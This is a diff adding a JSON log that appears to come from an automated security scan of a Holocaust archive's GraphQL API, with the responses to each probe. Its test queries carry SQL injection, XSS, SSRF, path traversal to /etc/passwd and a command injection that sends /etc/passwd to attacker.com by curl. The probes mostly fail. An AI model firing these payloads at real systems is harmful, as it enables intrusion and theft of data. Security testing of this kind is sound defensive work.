@@ -1,0 +1,3422 @@
+[
+  {
+    "query": {
+      "query": "\nquery {\n  authoritativeSets(first: 10) {\n    items {\n      id\n      name\n      itemCount\n    }\n    pageInfo {\n      hasNextPage\n      nextPage\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.184,
+    "timestamp": "2025-10-06T02:19:43.024772Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "authoritativeSets": {
+          "items": [
+            {
+              "id": "ehri_cb",
+              "name": "EHRI Corporate Bodies",
+              "itemCount": 5141
+            },
+            {
+              "id": "ehri_pers",
+              "name": "EHRI Personalities",
+              "itemCount": 3375
+            },
+            {
+              "id": "terezin-victims",
+              "name": "Terezin Victim list",
+              "itemCount": 8819
+            },
+            {
+              "id": "terezin-persons",
+              "name": "Terezin JMP Person list",
+              "itemCount": 58
+            },
+            {
+              "id": "jc-persons",
+              "name": "JMP Person list for Jewish Communities Guide",
+              "itemCount": 564
+            }
+          ],
+          "pageInfo": {
+            "hasNextPage": false,
+            "nextPage": null
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  authoritativeSets(from: \"1' UNION SELECT NULL,version()--\") {\n    items {\n      id\n      description\n    }\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.741,
+    "timestamp": "2025-10-06T02:19:46.324611Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Exception while fetching data (/authoritativeSets/items[0]/description) : null",
+          "locations": [
+            {
+              "line": 6,
+              "column": 7
+            }
+          ],
+          "path": [
+            "authoritativeSets",
+            "items",
+            0,
+            "description"
+          ],
+          "extensions": {
+            "classification": "DataFetchingException"
+          }
+        },
+        {
+          "message": "Exception while fetching data (/authoritativeSets/items[1]/description) : null",
+          "locations": [
+            {
+              "line": 6,
+              "column": 7
+            }
+          ],
+          "path": [
+            "authoritativeSets",
+            "items",
+            1,
+            "description"
+          ],
+          "extensions": {
+            "classification": "DataFetchingException"
+          }
+        },
+        {
+          "message": "Exception while fetching data (/authoritativeSets/items[2]/description) : null",
+          "locations": [
+            {
+              "line": 6,
+              "column": 7
+            }
+          ],
+          "path": [
+            "authoritativeSets",
+            "items",
+            2,
+            "description"
+          ],
+          "extensions": {
+            "classification": "DataFetchingException"
+          }
+        },
+        {
+          "message": "Exception while fetching data (/authoritativeSets/items[3]/description) : null",
+          "locations": [
+            {
+              "line": 6,
+              "column": 7
+            }
+          ],
+          "path": [
+            "authoritativeSets",
+            "items",
+            3,
+            "description"
+          ],
+          "extensions": {
+            "classification": "DataFetchingException"
+          }
+        },
+        {
+          "message": "Exception while fetching data (/authoritativeSets/items[4]/description) : null",
+          "locations": [
+            {
+              "line": 6,
+              "column": 7
+            }
+          ],
+          "path": [
+            "authoritativeSets",
+            "items",
+            4,
+            "description"
+          ],
+          "extensions": {
+            "classification": "DataFetchingException"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  authoritativeSets(first: 1) {\n    items {\n      name(filter: \"<img src=x onerror=alert(document.domain)>\")\n      annotations {\n        body\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.631,
+    "timestamp": "2025-10-06T02:19:48.757617Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[authoritativeSets/items/name]) : Unknown field argument 'filter'",
+          "locations": [
+            {
+              "line": 5,
+              "column": 12
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  authoritativeSets {\n    items {\n      links(targets: [\"http://internal-api/admin\"]) {\n        id\n        description\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.71,
+    "timestamp": "2025-10-06T02:19:51.570346Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[authoritativeSets/items/links]) : Unknown field argument 'targets'",
+          "locations": [
+            {
+              "line": 5,
+              "column": 13
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  authoritativeSets(from: \"'; curl https://attacker.com/pwn -d $(cat /etc/passwd)|\") {\n    items {\n      id\n      systemEvents {\n        logMessage\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.739,
+    "timestamp": "2025-10-06T02:19:54.867428Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Exception while fetching data (/authoritativeSets) : Last encoded character (before the paddings if any) is a valid base 64 alphabet but not a possible value. Expected the discarded bits to be zero.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "path": [
+            "authoritativeSets"
+          ],
+          "extensions": {
+            "classification": "DataFetchingException"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  authoritativeSets(from: \"../../../../etc/passwd\") {\n    items {\n      id\n      identifier\n    }\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.464,
+    "timestamp": "2025-10-06T02:19:57.383062Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Exception while fetching data (/authoritativeSets) : Last encoded character (before the paddings if any) is a valid base 64 alphabet but not a possible value. Expected the discarded bits to be zero.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "path": [
+            "authoritativeSets"
+          ],
+          "extensions": {
+            "classification": "DataFetchingException"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  authoritativeSets {\n    items {\n      description(set: \"<h1>Hacked</h1><iframe src='javascript:alert(1)'></iframe>\")\n      id\n    }\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.559,
+    "timestamp": "2025-10-06T02:19:59.840242Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[authoritativeSets/items/description]) : Unknown field argument 'set'",
+          "locations": [
+            {
+              "line": 5,
+              "column": 19
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  authoritativeSets(first: 1000) {\n    items {\n      id\n      authorities {\n        items {\n          descriptions {\n            biographicalHistory\n          }\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 2.023,
+        "timestamp": "2025-10-06T02:20:04.626719Z",
+        "response_body": {
+          "data": {
+            "authoritativeSets": {
+              "items": [
+                {
+                  "id": "ehri_cb",
+                  "authorities": {
+                    "items": [
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Velika \u017dupa was the highest regional authority in the Independent State of Croatia. It was responsible only to the Poglavnik Ante Paveli\u0107, who personally named its leader, and to the respective state ministries. Velika \u017dupa Posavje was founded on 10 June 1941 with the seat in the contemporary town of Slavonski Brod and continued to function until 1945. Velika \u017dupa Posavje included the administrative units (kotar) of Bijeljina, Br\u010dko, Brod na Savi, Derventa, Grada\u010dac and \u017dupanja. "
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      }
+                    ]
+                  }
+                },
+                {
+                  "id": "ehri_pers",
+                  "authorities": {
+                    "items": [
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Prof. Yeshayahu A. Jelinek was an historian of East-Central Europe, particularly of Slovakia. He focused primarily on the history of the Jews in Slovakia, autochthonous fascism and antisemitism, the Holocaust, the tensions and overlaps between nationalism and communism, the German-Israeli relations."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Chackelis Kibarskis gim\u0117 1903-10-14 Lazdij\u0173 rajone \u0160e\u0161tok\u0173 kaime.\r\n1918\u20131923 m. mok\u0117si Marijampol\u0117s \u017eyd\u0173 (hebraj\u0173) gimnazijoje.\r\n1923\u20131928 m. studijavo Vytauto Did\u017eiojo universiteto Medicinos fakultete.\r\n1932\u20131936 m. tobulinosi Prahos (\u010cekija) ir Vienos (Austrija) klinikose, 1936\u20131938 m. \u2013 Ciuricho (\u0160veicarija) klinikose.\r\n1930\u20131934 m. buvoo Kauno \u017eyd\u0173 ligonin\u0117s Vidaus lig\u0173 skyriaus gydytojas asistentas, 1934\u20131941 m. \u2013 to paties skyriaus ved\u0117jas.\r\n1942\u20131946 m. \u2013 Raudonosios armijos 16-osios lietuvi\u0161kosios \u0161auli\u0173 divizijos vyriausias terapeutas, Medicinos bataliono vadas.\r\n\r\n1946\u20131952 m. Ch. Kibarskis dirbo Vilniaus universiteto Medicinos fakulteto Hospitalin\u0117s terapijos katedros asistentu, docentu, 1972\u20131988 m. \u2013 profesoriumi, konsultantu.\r\n\r\nCh. Kibarskiui 1970 m. suteiktas medicinos moksl\u0173 daktaro laipsnis, 1972 m. - profesorius.\r\n1995\u20132003 m. Chackelis Kibarskis gyveno Lietuvoje ir Izraelyje.\r\nCh. Kibarskis vienas pirm\u0173j\u0173 Lietuvoje organizavo ir pl\u0117tojo elektrokardiografijos tyrimus, daugiau kaip 180 mokslini\u0173 publikacij\u0173 apie hipertonin\u0119, plau\u010di\u0173, kasos ligas, cukrin\u012f diabet\u0105 autorius arba bendraautorius. \r\nChackelis Kibarskis mir\u0117 2003 m. sausio 05 d. Vilniuje."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Anatolijus Rozenbliumas gim\u0117 1902 m. liepos 30 d. Balstog\u0117je, Lenkijoje. Berniukas buvo jauniausias i\u0161 penki\u0173 vaik\u0173 provizoriaus ir muzik\u0117s \u0161eimoje. Netrukus su t\u0117vais persik\u0117l\u0117 \u012f Kaun\u0105 ir 1912\u20131914 m. bei 1918\u20131920 m. mok\u0117si Kauno \u017eyd\u0173 berniuk\u0173 gimnazijoje. Per Pirm\u0105j\u012f pasaulin\u012f kar\u0105 \u0161eima buvo pasitraukusi \u012f Vitebsk\u0105, kur A. Rozenbliumas baig\u0117 Vitebsko gimnazij\u0105.\r\n1922 m. vien\u0105 semestr\u0105 studijavo Vienos Auk\u0161tosios technikos mokyklos Statybos fakultete, 1927 m. baig\u0117 Kioteno auk\u0161t\u0105j\u0105 pramon\u0117s mokykl\u0105. Netrukus \u0117m\u0117 s\u0117kmingai dirbti in\u017einieriumi Berlyne, bet, \u0161alyje sustipr\u0117jus nacizmui, 1929 m. gr\u012f\u017eo gyventi \u012f Kaun\u0105 ir \u012fstojo \u012f karo tarnyb\u0105. Iki 1936 m. buvo Lietuvos kariuomen\u0117s Karo but\u0173 valdybos in\u017einieriumi konstruktoriumi. Projektavo kareivines, sand\u0117lius, aviacijos angarus, dirbtuves, gara\u017eus. 1936 m. A. Rozenbliumas tapo laisvai samdomu in\u017einieriumi, projektuoti statybines konstrukcijas j\u012f kviet\u0117 \u017eymiausi to meto Lietuvos architektai.\r\n1940\u20131941 m. tapo Kauno universiteto Tilt\u0173 ir gel\u017ebetonini\u0173 konstrukcij\u0173 katedros neetatiniu lektoriumi.\r\n1941\u20131944 m. A. Rozenbliumas su \u0161eima buvo kalinamas Kauno gete, i\u0161 kurio jiems pasisek\u0117 pab\u0117gti. \u0160eima slapst\u0117si, kur\u012f laik\u0105 glaud\u0117si architekto Vladimiro Zubovo ir Danut\u0117s \u010ciurlionyt\u0117s-Zubovien\u0117s namuose Kaune.\r\n1944\u20131969 m. \u0117jo Kauno vastybinio universiteto (v\u0117liau pavadinto Kauno politechnikos institutu) gel\u017ebetonini\u0173 konstrukcij\u0173 katedros ved\u0117jo pareigas. 1967 m. apgyn\u0117 moksl\u0173 daktaro disertacij\u0105, 1968 m. gavo profesoriaus mokslin\u012f vard\u0105.\r\nLeido vadov\u0117lius ir paskait\u0173 konspektus, 1956 m. suk\u016br\u0117 ir i\u0161band\u0117 surenkam\u0105 poligoanalin\u0119 santvar\u0105 pramon\u0117s ir \u017eem\u0117s \u016bkio pastat\u0173 stogams, kuri po poros met\u0173 buvo \u012fvertinta respublikine premija.\r\n1969 m. persik\u0117l\u0117 \u012f Vilni\u0173, kur \u0117jo Vilniaus in\u017einerinio statybos instituto Speciali\u0173j\u0173 konstrukcij\u0173 katedros ved\u0117jo pareigas.\r\nRozenbliumas mir\u0117 1973 m. gegu\u017e\u0117s 27 d. Vilniuje."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "\u0160ein\u0117 Siderait\u0117 gim\u0117 1921-02-09 Lazdijuose.\r\n\r\n1932 m. baig\u0117 Lazdij\u0173 \u017eyd\u0173 prad\u017eios mokykl\u0105, kurioje mok\u0117si hebraj\u0173 kalba. 1932\u20131940 m. mok\u0117si Lazdij\u0173 \u201e\u017diburio\u201c gimnazijoje. 1940\u20131941 m. studijavo Kauno Vytauto Did\u017eiojo universiteto Medicinos fakultete. 1941 m. vasar\u0105 evakavosi \u012f Soviet\u0173 S\u0105jung\u0105 ir apsigyveno Tad\u017eikijoje. 1941\u20131945 m. studijavo Stalinabado (dabar Du\u0161anb\u0117, Tad\u017eikija) Medicinos institute bei dirbo preparatore, medicinos seserimi, gydytoja. 1945 m. gr\u012f\u017eo \u012f Lietuv\u0105 ir buvo priimta \u012f Vilniaus valstybinio universiteto Medicinos fakulteto 5-\u0105j\u012f kurs\u0105. Studijuodama dirbo Lietuvos TSR sveikatos apsaugos ministerijoje Kadr\u0173 skyriaus vyriausi\u0105ja inspektore.\r\n\r\n1947\u20131954 m. \u0160. Siderait\u0117 dirbo Vilniaus I tarybin\u0117je ligonin\u0117je terapeute ordinatore, nuo 1953 m. \u2013 ir endokrinologe antraeil\u0117se pareigose. 1948\u20131950 m. d\u0117st\u0117 Medicinos seser\u0173-aku\u0161eri\u0173 mokykloje Vilniuje. 1954\u20131960 m. \u2013 terapeut\u0117 endokrinolog\u0117 Lietuvos TSR sveikatos apsaugos ministerijos specpoliklinikoje, 1960\u20131967 m. \u2013 endokrinolog\u0117 Vilniaus I tarybin\u0117je ligonin\u0117je, 1967\u20131999 m. \u2013 endokrinolog\u0117 Vilniaus universitetin\u0117je klinikin\u0117je ligonin\u0117je.\r\n\r\nSpecializavosi klinikin\u0117s endokrinologijos srityje, buvo viena endokrinologijos tarnybos Lietuvoje organizatori\u0173. 1956 m. i\u0161rinkta Respublikinio prie\u0161struminio komiteto pirmininke, 1961 m. \u2013 Lietuvos TSR sveikatos apsaugos ministerijos neetatine vyriausi\u0105ja endokrinologe, 1962 m. \u2013 Lietuvos TSR endokrinolog\u0173 mokslin\u0117s draugijos valdybos nare. 1963 m. dalyvavo sudarant endeminio g\u016b\u017eio paplitimo Lietuvoje \u017eem\u0117lap\u012f.\r\n\r\n1967 m. apgyn\u0117 medicinos moksl\u0173 kandidat\u0117s disertacij\u0105 tema \u201eCukralige sergan\u010di\u0173j\u0173 ateroskleroz\u0117s eigos ypatyb\u0117s ir gydymas hipoglikemizuojan\u010diais sulfanilamidais\u201c. Klinikin\u0117s endokrinologijos temomis paskelb\u0117 per 50 mokslini\u0173 straipsni\u0173, perskait\u0117 nema\u017eai prane\u0161im\u0173 gydytoj\u0173 mokslin\u0117se konferencijose Lietuvoje ir Soviet\u0173 S\u0105jungoje.\r\n\r\n1966 m. \u0160. Sideraitei buvo suteikta auk\u0161\u010diausioji gydytojos terapeut\u0117s endokrinolog\u0117s kvalifikacija.\r\n\r\n\u0160ein\u0117 Siderait\u0117 mir\u0117 2005 m. kovo 15 d."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      }
+                    ]
+                  }
+                },
+                {
+                  "id": "terezin-victims",
+                  "authorities": {
+                    "items": [
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      }
+                    ]
+                  }
+                },
+                {
+                  "id": "terezin-persons",
+                  "authorities": {
+                    "items": [
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": "Born in 1911 in Neunkirchen. Died in 1991 in Essen. SS-Sturmbannf\u00fchrer. Member of Eichmann's staff. Coordinated the transportations of the Belgian, Dutch and Greek Jews in Salloniki. Camp Commander in Terez\u00edn from 1943 - 1944."
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
+                            "biographicalHistory": null
+                          }
+                        ]
+                      },
+                      {
+                        "descriptions": [
+                          {
